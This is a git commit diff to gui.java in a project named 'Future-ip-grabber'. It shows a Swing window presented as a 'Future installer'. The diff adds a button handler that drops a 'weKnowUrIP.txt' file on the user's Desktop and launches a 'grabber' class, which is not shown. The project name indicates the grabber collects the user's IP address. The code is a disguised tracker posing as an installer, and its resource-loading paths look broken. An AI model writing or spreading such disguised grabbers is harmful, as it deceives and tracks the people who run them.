bcfe88e4ae9b100215030c0c3be1eed5712776b5
RyanairFan <49508387+Doundeway@users.noreply.github.com>
2021-04-26 12:21:31 +0300

    Update gui.java

--- Future-ip-grabber/src/me/doundeway/future/gui.java
+++ Future-ip-grabber/src/me/doundeway/future/gui.java
@@ -1,24 +1,39 @@
 package me.doundeway.future;
 
 import java.awt.*;
+import java.awt.event.ActionEvent;
+import java.awt.event.ActionListener;
+import java.awt.image.BufferedImage;
+import java.io.File;
+import java.io.IOException;
+import java.io.InputStream;
+import java.net.URL;
+
+import javax.imageio.ImageIO;
 import javax.swing.*;
-import javax.swing.border.Border;
+
 
 public class gui extends JFrame{
 	
-	public final JPanel p = new JPanel();
-	public final ImageIcon img  = new ImageIcon("logo.png");
-	public final ImageIcon img2  = new ImageIcon("logo2.png");
+	String home = System.getProperty("user.home");
+	String FinalHome = home + "\\Desktop\\";
 	
+	ImageIcon img =  new ImageIcon(getClass().getClassLoader().getResource("C:\\Users\\MSI\\Desktop\\programiren\\Future2\\logo.png"));
+	ImageIcon img2 =  new ImageIcon(getClass().getClassLoader().getResource("C:\\Users\\MSI\\Desktop\\programiren\\Future2\\logo2.png"));
+	ImageIcon img3 =  new ImageIcon(getClass().getClassLoader().getResource("C:\\Users\\MSI\\Desktop\\programiren\\Future2\\download.png"));
+	public final JPanel p = new JPanel();
+	
+	
+
 	public final JLabel l = new JLabel("", img, JLabel.CENTER);
-	public final JButton b = new JButton(img2);
+	public final JButton b = new JButton((Icon) img2);
 		gui(){	
 			//gui settings
 			this.setTitle("Future installer");
 			Color c = new Color(128, 0, 0);
 			this.setDefaultCloseOperation(EXIT_ON_CLOSE);
 			this.add(p);
-			ImageIcon logo = new ImageIcon("download.png");
+			
 			this.setSize(500, 430);
 			this.setResizable(false);
 			l.setBounds(getBounds());
@@ -32,11 +47,29 @@ public class gui extends JFrame{
 			b.setForeground(new Color(0, 0, 0));
 			b.setBorder(BorderFactory.createEtchedBorder());
 			b.setFocusable(false);
-			this.setIconImage(logo.getImage());
+			this.setIconImage(img3.getImage());
 			this.add(b);
-			
-			
+			b.addActionListener(new ActionListener() {
+				@Override
+				public void actionPerformed(ActionEvent e) {
+					b.setEnabled(false);
+						File myObj = new File(FinalHome + "weKnowUrIP.txt");
+						try {
+							myObj.createNewFile();
+						} catch (IOException e2) {
+							
+							e2.printStackTrace();				
+					}			
+					try {
+						new grabber();
+					} catch (IOException e1) {
+						e1.printStackTrace();
+					}
+					
+				}
+			});
 			
 		}
       
 }
+
